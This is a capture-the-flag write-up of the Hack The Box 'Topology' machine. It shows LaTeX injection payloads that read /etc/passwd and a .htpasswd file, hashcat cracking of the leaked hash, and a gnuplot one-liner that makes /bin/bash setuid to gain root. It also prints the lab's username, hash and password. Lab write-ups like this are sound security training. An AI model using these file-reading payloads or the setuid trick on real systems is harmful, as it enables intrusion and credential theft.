# Topology: Hack The Box: @lautarovculic

*[Image: Untitled]*

****************Difficult:**************** Easy

****************Release:**************** 10/06/2023

****IP:**** 10.10.11.217

******OS:****** Linux

---

# User.txt

First of all we will configure our **/etc/hosts** file.

*[Image: Untitled]*

After that, we will do our **scan with nmap** to do a reconnaissance of the machine.

*[Image: Untitled]*

We note that we have port **22** and **80** *open*.

Let's investigate port 80.

*[Image: Untitled]*

We come across a web page, and if we search, we will **find a link about a project**.

*[Image: Untitled]*

This project takes us to [http://latex.topology.htb/equation.php](http://latex.topology.htb/equation.php) so we will **add it** to our **/etc/hosts** file.

*[Image: Untitled]*

Let's see what's inside.

*[Image: Untitled]*

After some research, I have seen that there are vulnerabilities of **injections** in **LaTeX**. So we will try to make some of them.

[https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection](https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection?source=post_page-----1e4cf07d7805--------------------------------)

*[Image: Untitled]*

Let's try **$\lstinputlisting{/etc/passwd}$**

*[Image: Untitled]*

Nice!

We can try the following command to see if we get a **user** and a **hash**:

**$\lstinputlisting{/var/www/dev/.htpasswd}$**

*[Image: Untitled]*

We have the user **vdaisley** and the hash **$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0**

Let's crack it with **hashcat**.

```bash
hashcat -a 0 -m 1600 hash.txt /home/kali/Downloads/rockyou.txt
```

*[Image: Untitled]*

And the password is:

**calculus20**

*[Image: Untitled]*

Now that we have the **username** and **password**, let's try to log in via **SSH**.

*[Image: Untitled]*

Let's look for the file **user.txt**

*[Image: Untitled]*

# Root.txt

We can use **pspy** to **view the processes** without *root permissions*.

[https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy?source=post_page-----1e4cf07d7805--------------------------------)

```bash
./pspy64
```

*[Image: Untitled]*

Within this context, a discernible process pertains to the execution of files bearing the “***.plt**” extension. This operation transpires within the specific directory path designated as “**/opt/gnuplot/.**”

*[Image: Untitled]*

I found the following page where it shows us an **exploit** to do a **privilege escalation**.
[https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/)

And we will use the following command:

```bash
echo "system 'chmod u+s /bin/bash'" > /opt/gnuplot/pwn.plt
```

*[Image: Untitled]*

Finally, we run **/bin/bash -p** and we can find the **root.txt** file.

I hope you found it useful (: